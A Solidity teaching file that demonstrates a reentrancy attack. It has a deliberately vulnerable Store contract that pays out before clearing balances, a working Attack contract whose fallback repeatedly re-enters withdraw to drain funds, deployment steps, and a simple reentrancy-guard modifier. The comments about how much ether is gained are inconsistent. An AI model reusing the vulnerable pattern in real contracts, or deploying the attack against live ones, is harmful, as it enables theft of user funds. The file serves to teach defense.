//SPDX-License-Identifier:MIT
pragma solidity ^0.8.13;

// NOTES
//Reentracy is vulnerablility
//attacker stole contract balance with this technique
//let's learn about how attack happens and then how to tackle
//this is solidity hack 
//avoid this mistake in your code

/*
 
 1. Deploy store
 2. deposite 1 ether from bob, and 1 ether from alice to contract
 3. deploy attack( new contract) with store address
 4. call Attack.attack and send 1 ether and get back 2 ether 
 5. attacker get 2 ether (hacking done !!!)

*/

contract Store{

    mapping(address => uint ) public balances;

    function deposite() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal >0);
        (bool success ,) = msg.sender.call{value:bal}("");
        require(success, 'Invalid execution');
        balances[msg.sender] = 0;
    }

    function contractBalance() public view returns(uint value){
         return address(this).balance;
    }

}


/* 
    sending 1 ether to attack() function to send 1 ether to store contract

    _______process happens in this sequence__________
    
    Attack.attack
    Store.deposite 
    store.withdraw
   
    Attack fallback(receive 1 ether)
    store.withdraw 
    Attack fallback(receive 1 ether)
    store.withdraw 
    Attack fallback(receive 1 ether)
    store.withdraw

    getting 3 ether ....
    
*/



// let's attack 

contract Attack {

    Store public Nstore;

    constructor(address _store){
        Nstore = Store(_store);
    }

    // fallback called when store sends ether to Nstore contract

    fallback() external payable{
        if(address(Nstore).balance >= 1 ether){
            Nstore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        Nstore.deposite{value:1 ether}();
        Nstore.withdraw();
    }

    function getBalance() public view returns(uint _bal){

            return address(this).balance;

    }



}

// how to prevent from this 
// many ways are available but this is recomminded

contract ReEntracyGuard {
    bool internal locked;
    modifier noReentracy(){
        require(!locked , "No reentracy");
        locked = true;
        _;
        locked = false;

    }
}